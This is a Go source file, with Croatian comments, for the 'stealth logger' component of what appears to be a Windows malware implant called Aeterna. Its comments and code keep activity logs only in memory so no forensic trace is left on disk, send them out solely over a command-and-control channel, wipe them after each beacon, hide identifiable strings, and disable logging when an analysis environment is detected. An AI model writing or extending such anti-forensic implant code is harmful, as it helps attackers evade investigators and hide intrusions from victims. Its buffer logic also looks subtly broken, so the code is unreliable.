//go:build windows
// +build windows

/*
   ============================================================================
   X.8 — STEALTH LOGGER (Zero-Trace)
   ============================================================================

   LAYER: Contextual (Layer 3) — Minimal Footprint

   PROBLEMI U ORIGINALNOM KODU:
   - File-based logging: %APPDATA%\Aeterna\log_*.txt
   - Svaka operacija se logira u file — FORENSIC EVIDENCE
   - Log file sadrži SVE: komande, IP adrese, stringovi
   - Format je čitljiv: "[AETERNA] Pokretanje..."
   - Log file ostaje na disku NAKON gašenja programa
   - fmt.Print piše na stdout — vidljivo u console

   RJEŠENJA:
   1. IN-MEMORY ONLY — NIKADA se ne piše na disk
   2. Circular buffer — max 4KB, old data overwritten
   3. Output ide SAMO preko C2 kanala
   4. Nema stdout output-a
   5. Nema identifiable stringova ("AETERNA", "ERROR", itd.)
   6. Koristi kodirane poruke (numeričke kategorije)
   7. Auto-wipe: buffer se briše nakon svakog beacon-a
*/

package main

import (
	"fmt"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================================
// CONFIGURATION
// ============================================================================

const (
	// Maksimalna veličina in-memory log buffer-a
	maxLogBufferSize = 4096 // 4KB

	// Log level-i koriste NUMERIČKE kategorije (ne stringove)
	// 0 = Info, 1 = Warning, 2 = Error, 3 = Debug
	// Analitičar vidi samo brojeve, ne značenja
)

// ============================================================================
// STEALTH LOGGER
// ============================================================================

type StealthLogger struct {
	buffer   [maxLogBufferSize]byte // Circular buffer
	head     uint32                 // Write position (atomic)
	tail     uint32                 // Read position
	mu       sync.Mutex
	disabled bool // Disabled in analysis mode
}

// Globalni logger
var stealthLog *StealthLogger

// logLevelNames — NEMA stringova u kodu — koristi se SAMO za debug build
var logLevelNames = []string{"I", "W", "E", "D"}

// ============================================================================
// INITIALIZATION
// ============================================================================

// InitStealthLogger inicijalizira stealth logger
func InitStealthLogger() {
	stealthLog = &StealthLogger{}

	// Ako je analitičko okruženje, onemogući logging
	if CheckAnalysis() {
		stealthLog.disabled = true
	}
}

// ============================================================================
// LOGGING — In-memory circular buffer
// ============================================================================

// Log zapisuje poruku u in-memory buffer
// Format: [timestamp:4][level:1][msg_len:2][message]
func Log(level int, format string, args ...interface{}) {
	if stealthLog == nil || stealthLog.disabled {
		return
	}

	msg := fmt.Sprintf(format, args...)

	// Timestamp: 4 bytes (Unix time, low entropy — izgleda kao bilo koji broj)
	ts := uint32(time.Now().Unix())

	// Level: 1 byte
	lvl := byte(level & 0xFF)

	// Message length: 2 bytes
	msgLen := uint16(len(msg))

	// Total entry size
	entrySize := 4 + 1 + 2 + len(msg)

	// Write to circular buffer
	stealthLog.mu.Lock()
	defer stealthLog.mu.Unlock()

	head := atomic.LoadUint32(&stealthLog.head)

	// Write timestamp (4 bytes, big-endian)
	stealthLog.buffer[head%maxLogBufferSize] = byte(ts >> 24)
	stealthLog.buffer[(head+1)%maxLogBufferSize] = byte(ts >> 16)
	stealthLog.buffer[(head+2)%maxLogBufferSize] = byte(ts >> 8)
	stealthLog.buffer[(head+3)%maxLogBufferSize] = byte(ts)

	// Write level
	stealthLog.buffer[(head+4)%maxLogBufferSize] = lvl

	// Write message length
	stealthLog.buffer[(head+5)%maxLogBufferSize] = byte(msgLen >> 8)
	stealthLog.buffer[(head+6)%maxLogBufferSize] = byte(msgLen)

	// Write message
	for i := 0; i < len(msg); i++ {
		stealthLog.buffer[(head+7+uint32(i))%maxLogBufferSize] = msg[i]
	}

	// Advance head
	newHead := head + uint32(entrySize)
	atomic.StoreUint32(&stealthLog.head, newHead)

	// If buffer wrapped, advance tail
	if newHead > maxLogBufferSize {
		stealthLog.tail = newHead - maxLogBufferSize
	}
}

// LogInfo, LogWarning, LogError, LogDebug — convenience funkcije
func LogInfo(format string, args ...interface{})    { Log(0, format, args...) }
func LogWarning(format string, args ...interface{}) { Log(1, format, args...) }
func LogError(format string, args ...interface{})   { Log(2, format, args...) }
func LogDebug(format string, args ...interface{})   { Log(3, format, args...) }

// ============================================================================
// BUFFER EXTRACTION — Slanje preko C2
// ============================================================================

// ExtractLog izvlači log podatke za slanje
func ExtractLog() []byte {
	if stealthLog == nil {
		return nil
	}

	stealthLog.mu.Lock()
	defer stealthLog.mu.Unlock()

	head := atomic.LoadUint32(&stealthLog.head)
	tail := stealthLog.tail

	if head <= tail {
		return nil
	}

	// Izvuci podatke
	size := head - tail
	if size > maxLogBufferSize {
		size = maxLogBufferSize
	}

	result := make([]byte, size)
	for i := uint32(0); i < size; i++ {
		result[i] = stealthLog.buffer[(tail+i)%maxLogBufferSize]
	}

	// Wipe buffer after extraction
	stealthLog.head = 0
	stealthLog.tail = 0
	for i := range stealthLog.buffer {
		stealthLog.buffer[i] = 0
	}

	return result
}

// ============================================================================
// LOG FORMATTING — Za debug (nema u produkciji)
// ============================================================================

// FormatLog formatira log podatke za debug
// OVA FUNKCIJA SE UKLANJA U PRODUKCIJSKOM BUILDU
func FormatLog(data []byte) string {
	if len(data) == 0 {
		return ""
	}

	var result string
	offset := 0

	for offset < len(data) {
		if offset+7 > len(data) {
			break
		}

		// Read timestamp
		ts := uint32(data[offset])<<24 | uint32(data[offset+1])<<16 |
			uint32(data[offset+2])<<8 | uint32(data[offset+3])

		// Read level
		lvl := int(data[offset+4])
		if lvl >= len(logLevelNames) {
			lvl = 0
		}

		// Read message length
		msgLen := uint16(data[offset+5])<<8 | uint16(data[offset+6])

		// Read message
		if offset+7+int(msgLen) > len(data) {
			break
		}
		msg := string(data[offset+7 : offset+7+int(msgLen)])

		result += fmt.Sprintf("[%d] %s: %s\n", ts, logLevelNames[lvl], msg)
		offset += 7 + int(msgLen)
	}

	return result
}

// ============================================================================
// NO-OP LOGGER — Ako je logging onemogućen
// ============================================================================

// LogFunctionEntry/Exit — zamjena za originalne funkcije
// U stealth modu ove funkcije rade NISTA
func LogFunctionEntry(funcName string, args ...interface{})  {}
func LogFunctionExit(funcName string, result ...interface{}) {}

// LogHTTPRequest/Response — zamjena za originalne
func LogHTTPRequest(method, url string, headers map[string]string, body []byte) {}
func LogHTTPResponse(statusCode int, body []byte, duration time.Duration)       {}

// LogCommand — zamjena
func LogCommand(cmdLine string, workDir string) {}
func LogCommandOutput(output string)            {}

// LogFile — zamjena
func LogFile(operation string, filePath string, size int64, err error) {}

// LogRegistry — zamjena
func LogRegistry(operation string, key string, value string, data interface{}) {}

// LogNetwork — zamjena
func LogNetwork(activity string, details map[string]string) {}

// LogSystemInfo — zamjena
func LogSystemInfo(hostname string, username string, osInfo OSInfo) {}

// CloseLogger — zamjena (nema file za zatvoriti)
func CloseLogger() error {
	// Wipe buffer
	if stealthLog != nil {
		stealthLog.mu.Lock()
		for i := range stealthLog.buffer {
			stealthLog.buffer[i] = 0
		}
		stealthLog.head = 0
		stealthLog.tail = 0
		stealthLog.mu.Unlock()
	}
	return nil
}
